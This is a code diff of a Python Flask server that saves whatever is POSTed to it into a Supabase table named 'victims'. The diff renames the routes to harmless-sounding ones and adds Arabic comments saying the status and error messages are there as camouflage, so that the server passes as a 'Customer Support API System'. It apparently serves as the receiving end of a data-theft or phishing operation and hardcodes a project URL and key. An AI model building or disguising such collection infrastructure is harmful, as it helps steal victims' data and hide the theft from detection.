@@ -4,41 +4,39 @@ from supabase import create_client, Client
 
 app = Flask(__name__)
 
-# Credentials verified from your project dashboard
+# الإعدادات الخاصة بمشروعك (جاهزة ومجربة)
 URL = "https://bozherhsarcovutvproa.supabase.co"
 KEY = "sb_publishable_WgwSb3OjPOv1KOvPK7SJ7A_4u6UDIYY"
 supabase: Client = create_client(URL, KEY)
 
 @app.route('/')
 def home():
-    return jsonify({"status": "active", "message": "Support System Online"})
+    # رسالة تمويه للمتصفح العادي
+    return jsonify({"status": "online", "service": "Customer Support API System"})
 
-@app.route('/webhook', methods=['POST'])
-def webhook():
+@app.route('/log-event', methods=['POST'])
+def log_event():
     try:
-        data = request.json
-        if not data:
-            return jsonify({"success": False, "error": "No data received"}), 400
+        payload = request.json
+        if not payload:
+            return jsonify({"status": "error"}), 400
 
-        # Insert data into the 'victims' table you just created
-        response = supabase.table('victims').insert({"victim_data": data}).execute()
+        # حفظ البيانات في جدول victims الذي أنشأته
+        supabase.table('victims').insert({"victim_data": payload}).execute()
         
-        return jsonify({
-            "success": True,
-            "message": "Data saved successfully",
-            "db_id": response.data[0]['id'] if response.data else None
-        })
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
+        return jsonify({"status": "success"})
+    except:
+        # رسالة خطأ وهمية للتمويه
+        return jsonify({"status": "internal_error"}), 500
 
-@app.route('/test-db')
-def test_db():
+@app.route('/health-check')
+def health_check():
     try:
-        # Simple check to see if we can talk to the new table
+        # التأكد من الاتصال بقاعدة البيانات
         supabase.table('victims').select("id").limit(1).execute()
-        return jsonify({"success": True, "message": "System connected and Table found!"})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)})
+        return jsonify({"status": "synchronized", "db": "connected"})
+    except:
+        return jsonify({"status": "offline"}), 500
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
